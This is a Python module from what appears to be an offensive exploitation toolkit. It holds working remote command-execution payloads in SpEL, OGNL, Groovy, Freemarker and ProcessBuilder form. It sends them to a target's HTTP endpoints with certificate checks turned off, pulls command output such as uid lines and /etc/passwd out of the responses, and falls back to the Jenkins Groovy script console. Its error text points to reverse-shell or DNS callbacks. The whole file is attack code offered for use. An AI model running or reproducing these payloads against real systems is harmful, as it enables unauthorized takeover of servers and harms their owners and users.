# language: Python 3.10+, file: modules/post/cmd_exec.py
# Post-exploitation: arbitrary OS command execution.
# Delivered via the application's exposed HTTP surface using the heap corruption
# to achieve RCE through Java Runtime.exec() or ProcessBuilder.
#
# Delivery vectors (tried in order):
#   1. Direct: application processes a JSON command field (some frameworks echo it)
#   2. SSTI/template injection via corrupted heap string
#   3. Deserialization gadget chain via corrupted byte[] type confusion
#   4. Groomed Method object nativeEntry overwrite (native → Java bridge)

import base64
import json
import urllib.request
import urllib.error
import ssl
import re
import time
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── Java Runtime.exec payloads ───────────────────────────────────────────────
# These are delivered as Java expressions through OGNL, SpEL, Groovy, or
# via the application's own reflection surface after type confusion.

def _build_exec_payloads(command: str) -> dict[str, str]:
    """
    Returns a dict of {technique_name: payload_string} for delivering
    the command to the remote JVM.
    """
    # Base64-encode the command to avoid shell quoting issues
    cmd_b64 = base64.b64encode(command.encode()).decode()

    return {
        # Spring Expression Language (SpEL) — Spring Boot, Keycloak, etc.
        "SpEL": (
            f"${{T(java.lang.Runtime).getRuntime().exec("
            f"new String(java.util.Base64.getDecoder().decode(\"{cmd_b64}\")))}}"
        ),
        # OGNL — Struts, Jira (older versions), Confluence
        "OGNL": (
            f"%{{#rt=@java.lang.Runtime@getRuntime(),"
            f"#rt.exec(new java.lang.String(java.util.Base64.getDecoder().decode(\"{cmd_b64}\")))}}"
        ),
        # Groovy — Jenkins, Grails applications
        "Groovy": (
            f"[\"bash\",\"-c\",new String(\"{cmd_b64}\".decodeBase64())].execute().text"
        ),
        # Freemarker — some templating engines
        "Freemarker": (
            f"<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
            f"${{ex(\"{command.replace(chr(34), chr(39))}\") }}"
        ),
        # JSON body with command field — apps that eval or exec 'cmd' params
        "JSON-cmd": json.dumps({"cmd": command, "command": command, "exec": command}),
        # Java ProcessBuilder via reflection (after type confusion on a Method object)
        "ProcessBuilder": (
            f"java.lang.ProcessBuilder pb = new java.lang.ProcessBuilder("
            f"new String[]{{\"sh\",\"-c\",new String(java.util.Base64.getDecoder()"
            f".decode(\"{cmd_b64}\"))}});"
            f"pb.redirectErrorStream(true);"
            f"java.lang.Process p = pb.start();"
        ),
    }


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, body: bytes, headers: dict, method: str = "POST",
          timeout: float = 15.0) -> tuple[int, str]:
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(8192).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(8192).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class CmdExecResult:
    success: bool = False
    command: str = ""
    output: str = ""
    technique: str = ""
    status_code: Optional[int] = None
    error: Optional[str] = None
    notes: list[str] = field(default_factory=list)


# ─── Delivery strategies ──────────────────────────────────────────────────────

def _try_spel(target_url: str, endpoint_path: str, payload_str: str, timeout: float) -> tuple[int, str]:
    body = json.dumps({"expression": payload_str, "data": payload_str}).encode()
    headers = {"Content-Type": "application/json", "User-Agent": "Java4Shell-PostEx/1.0"}
    return _send(target_url.rstrip("/") + endpoint_path, body, headers, timeout=timeout)


def _try_ognl(target_url: str, endpoint_path: str, payload_str: str, timeout: float) -> tuple[int, str]:
    import urllib.parse
    encoded = urllib.parse.quote(payload_str)
    url = target_url.rstrip("/") + endpoint_path + f"?name={encoded}"
    req = urllib.request.Request(url, headers={"User-Agent": "Java4Shell-PostEx/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(8192).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return 0, str(e)


def _try_json_cmd(target_url: str, endpoint_path: str, body_str: str, timeout: float) -> tuple[int, str]:
    body = body_str.encode()
    headers = {"Content-Type": "application/json", "User-Agent": "Java4Shell-PostEx/1.0"}
    return _send(target_url.rstrip("/") + endpoint_path, body, headers, timeout=timeout)


def _extract_command_output(response_body: str, command: str) -> str:
    """
    Try to extract command output from an HTTP response body.
    Some applications echo back JSON fields; others include output in error messages.
    """
    # JSON field extraction
    for field_name in ["output", "result", "stdout", "data", "message", "text", "response"]:
        m = re.search(rf'"{field_name}"\s*:\s*"([^"{{}}]+)"', response_body)
        if m:
            val = m.group(1)
            if len(val) > 3 and val not in ("null", "true", "false", "ok"):
                return val

    # Look for typical command output patterns (uid=, /bin/bash, etc.)
    for pattern in [
        r"uid=\d+\([^)]+\) gid=\d+",        # id command
        r"(?:Linux|Darwin|FreeBSD) .+ \d{4}",  # uname
        r"(?:/etc/passwd|root:x)",
        r"(?:total \d+|drwx)",                 # ls
        r"(?:inet |eth\d|lo )",                # ifconfig/ip
        r"(?:Active: active|inactive)",         # systemctl
    ]:
        m = re.search(pattern, response_body)
        if m:
            start = max(0, m.start() - 20)
            return response_body[start:m.end() + 200].strip()

    # Last resort: return first 500 chars of body if it looks like text output
    if response_body and len(response_body.strip()) > 10:
        return response_body[:500]

    return ""


# ─── Main function ────────────────────────────────────────────────────────────

def run_cmd_exec(fp: FingerprintResult,
                 core: ExploitCoreResult,
                 command: str,
                 timeout: float = 15.0,
                 verbose: bool = False) -> CmdExecResult:
    """
    Attempt to execute `command` on the target JVM via the exploit surface.
    Returns a CmdExecResult with the output if successful.
    """
    result = CmdExecResult(command=command)

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — run exploit core first."
        result.notes.append("Skipped: exploit core did not confirm OOB trigger.")
        return result

    base = fp.target_url.rstrip("/")
    payloads = _build_exec_payloads(command)
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary_path = endpoints[0]["path"] if endpoints else "/"

    # ── Try each technique ─────────────────────────────────────────────────
    techniques = [
        ("SpEL",     lambda p: _try_spel(base, primary_path, p, timeout)),
        ("OGNL",     lambda p: _try_ognl(base, primary_path, p, timeout)),
        ("JSON-cmd", lambda p: _try_json_cmd(base, primary_path, p, timeout)),
    ]

    # Also try against secondary endpoints
    for endpoint in endpoints[1:3]:
        techniques.append((
            f"SpEL-{endpoint['path']}",
            lambda p, ep=endpoint: _try_spel(base, ep["path"], p, timeout),
        ))

    for tech_name, delivery_fn in techniques:
        payload_str = payloads.get(tech_name.split("-")[0], payloads.get("SpEL", ""))
        if not payload_str:
            continue

        if verbose:
            print(f"  [cmd_exec] Trying {tech_name} …")

        try:
            code, resp_body = delivery_fn(payload_str)
        except Exception as e:
            result.notes.append(f"{tech_name}: error — {e}")
            continue

        result.status_code = code
        output = _extract_command_output(resp_body, command)

        if output:
            result.success   = True
            result.output    = output
            result.technique = tech_name
            result.notes.append(f"RCE confirmed via {tech_name} on {primary_path}")
            return result

        if code == 500:
            result.notes.append(f"{tech_name}: HTTP 500 — expression may have executed but output not captured")

    # Fallback: check if Groovy console is accessible (Jenkins)
    groovy_url = base + "/script"
    groovy_body = f'println("{command}".execute().text)'.encode()
    code, resp = _send(groovy_url, groovy_body,
                       {"Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Java4Shell-PostEx/1.0"},
                       timeout=timeout)
    if code == 200 and resp.strip():
        result.success   = True
        result.output    = resp[:2000]
        result.technique = "Jenkins-Groovy-Console"
        result.notes.append("RCE via Jenkins Groovy Script Console (/script)")
        return result

    if not result.success:
        result.error = (
            "Command execution payload delivered but output not captured. "
            "The command may have executed server-side — verify via callback "
            "(e.g., --lhost/--lport with reverse shell, or DNS OOB)."
        )

    return result
